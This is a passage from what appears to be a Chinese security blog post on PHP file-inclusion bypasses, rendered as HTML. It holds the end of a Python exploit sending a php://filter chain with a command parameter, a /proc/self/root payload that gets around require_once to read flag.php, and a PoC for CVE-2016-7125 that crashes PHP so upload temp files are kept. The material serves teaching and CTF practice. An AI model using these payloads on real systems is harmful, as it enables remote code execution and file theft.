+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">final_payload</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">f</span><span style="color:#a6be9d">&#34;php://filter/</span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">filters</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">/resource=</span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">file_to_use</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">final_payload</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">r</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">requests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">url</span>, <span style="color:#58a1dd">params</span><span style="color:#ff636f">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#34;0&#34;</span>: <span style="color:#58a1dd">command</span>,
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####&#34;action&#34;: &#34;include&#34;,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#34;file&#34;</span>: <span style="color:#58a1dd">final_payload</span>
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">r</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">text</span>)</span></span></code></pre></div><h5 id="require_once-绕过" class="heading-element"><span>0.0.0.6  require_once 绕过</span>
+  <a href="#require_once-%e7%bb%95%e8%bf%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><a href="https://www.anquanke.com/post/id/213235#h3-5"target="_blank" rel="external nofollow noopener noreferrer">https://www.anquanke.com/post/id/213235#h3-5</a></p>
+<p>payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">php</span><span style="color:#ff636f">://</span><span style="color:#58a1dd">filter</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">convert</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">base64</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">encode</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">resource</span><span style="color:#ff636f">=/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">proc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">root</span><span style="color:#ff636f">/</span><span style="color:#ff636f">var</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">html</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">flag</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">php</span></span></span></code></pre></div><h5 id="apache下php崩溃永久保留临时文件" class="heading-element"><span>0.0.0.7  Apache下PHP崩溃永久保留临时文件</span>
+  <a href="#apache%e4%b8%8bphp%e5%b4%a9%e6%ba%83%e6%b0%b8%e4%b9%85%e4%bf%9d%e7%95%99%e4%b8%b4%e6%97%b6%e6%96%87%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>CVE-2016-7125</p>
+<p>5.6.25 之前的 PHP 和 7.0.10 之前的 7.x 中的 ext/session/session.c 以触发错误解析的方式跳过无效的会话名称，这允许远程攻击者通过控制会话来注入任意类型的会话数据名称。</p>
+<p>原理</p>
+<p>文件流保存</p>
+<p>PHP在处理一个文件上传的请求数据包时，会将目标文件流保存到临时目录下，并且会以<code>PHP+随机六位字符串</code>进行保存（<code>php[0-9A-Za-z]{3,4,5,6}</code>)，而一个文件流的处理有存活周期，在php运行的过程中，假如php非正常结束，比如崩溃，那么这个临时文件就会永久的保留。如果php正常的结束，并且该文件没有被移动到其它地方也没有被改名，则该文件将在表单请求结束时被删除。在这期间，一个临时文件存活时间大概有30s。</p>
+<p>了解了处理机制，那我们如何去确定临时文件呢？最简单的是暴力破解，但是30s的时间来确定1/2176782336，emm&hellip;这个概率基本不可能。。。</p>
+<p>除了在30s内确定临时文件以外，还有什么别的办法呢？前面说过，PHP崩溃把临时文件永久保留下来，既然这样的话，只要我们引起PHP崩溃我们就有足够的时间来进行爆破了。</p>
+<p>######## 影响测试</p>
+<p>直接用我们的POC测试漏洞影响版本。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">file</span>(<span style="color:#58a1dd">urldecode</span>(<span style="color:#a6be9d">&#39;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
+</span></span></code></pre></div><p>经过实测，PHP&lt;7.4 &amp; PHP&lt;5.6.25 两种条件下都可实现PHP崩溃</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/owasp/" class="post-tag" title="Tags - OWASP">OWASP</a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-tag" title="Tags - 文件包含">文件包含</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/owasp/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/112/" class="post-nav-item" rel="prev" title="文件包含-基础"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>文件包含-基础</a>
+      <a href="/posts/owasp/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/114/" class="post-nav-item" rel="next" title="文件上传-Bypass">文件上传-Bypass<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
